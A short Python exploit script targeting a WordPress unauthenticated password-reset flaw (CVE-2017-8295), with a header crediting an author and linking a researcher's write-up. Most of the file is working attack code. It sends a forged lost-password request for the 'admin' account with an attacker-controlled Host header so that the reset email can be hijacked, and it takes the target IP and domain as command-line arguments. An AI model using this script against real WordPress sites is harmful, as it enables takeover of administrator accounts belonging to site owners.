'''
This is Wordpress Password reset exploit vulnerability
Author: Virendra Bisht (virendra.bisht@outlook.com

Ref:
Researcher has explained the exploit very well in below blog.
https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html


'''

import sys;

def main(host,domain):
    import socket
    s = socket.socket()
    port = 80

    buf="POST /wp/wp-login.php?action=lostpassword HTTP/1.1\r\n"
    buf+="Host:"+domain+"\r\n"
    buf+="Content-Type: application/x-www-form-urlencoded\r\n"
    buf += "Content-Length: 56\r\n\r\n"
    buf+="user_login=admin&redirect_to=&wp-submit=Get+New+Password"

    s.connect((host, port))
    print(buf)
    s.sendall(buf)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Please enter the correct parameters")
        print("Ex: python exploit-wp.py WP-IP domainName")
        exit();
    else:
        host=sys.argv[1];
        domain = sys.argv[2];
        print('Calling exploit')
        main(host, domain)
